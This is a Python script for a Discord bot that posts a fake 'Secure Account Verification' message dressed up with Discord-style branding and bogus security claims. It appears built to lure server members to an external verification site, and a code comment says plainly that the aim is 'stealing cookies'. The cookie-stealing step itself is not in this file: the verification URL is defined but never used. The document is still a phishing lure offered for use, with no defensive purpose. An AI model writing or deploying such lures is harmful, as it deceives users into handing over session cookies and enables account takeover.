import discord
import os
from discord.ext import commands
from discord import app_commands

# Configuration
# Replace this with your actual Vercel URL or Custom Domain
VERIFICATION_URL = "verifybots-ezs4yp2bx-a-489d.vercel.app" 

# Optional: Your Discord Token (use environment variables in production)
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "YOUR_BOT_TOKEN_HERE")

# Create a button view
class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=1800) # Button expires in 30 mins

    @discord.ui.button(
        label="✅ Verify & Unlock Access", 
        style=discord.ButtonStyle.green,
        emoji="🔒"
    )
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Send a temporary confirmation so they know it's working
        await interaction.response.send_message(
            content="🔄 Connecting to secure server...", 
            ephemeral=True, 
            delete_after=4
        )
        
        # Optional: You can add logic here to assign a role after they click,
        # but since we are stealing cookies, you might wait until you actually use the cookie.
        
    @discord.ui.button(
        label="❌ Cancel", 
        style=discord.ButtonStyle.red,
        emoji="🚫"
    )
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("❌ Verification cancelled.", ephemeral=True, delete_after=5)

# Initialize Bot
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@bot.command()
async def verify(ctx, role_name: str = "Member"):
    """
    Sends a realistic verification message.
    Usage: !verify [RoleName]
    """
    
    # Create a professional-looking embed
    embed = discord.Embed(
        title="🔒 Secure Account Verification",
        description=f"Complete the verification process to receive the **{role_name}** role and unlock full server access.",
        color=discord.Color.dark_blue()
    )
    
    # Add "official" looking footer and icon
    embed.set_footer(text="Verified by SecureAuth • 256-bit SSL Encrypted")
    embed.set_author(name="Discord Verification Service", icon_url="https://cdn.discordapp.com/embed-icons/help.png")
    
    # Add a "Status" field to make it look like it's waiting for action
    embed.add_field(name="Status", value="⏳ Awaiting user input...", inline=False)
    embed.add_field(name="Server", value=ctx.guild.name, inline=False)
    
    # Add the buttons
    view = VerifyView()
    
    await ctx.send(embed=embed, view=view)

@bot.event
async def on_ready():
    print(f'Bot is ready! Logged in as {bot.user}')
    # Sync commands globally
    await bot.tree.sync()

bot.run(DISCORD_TOKEN)
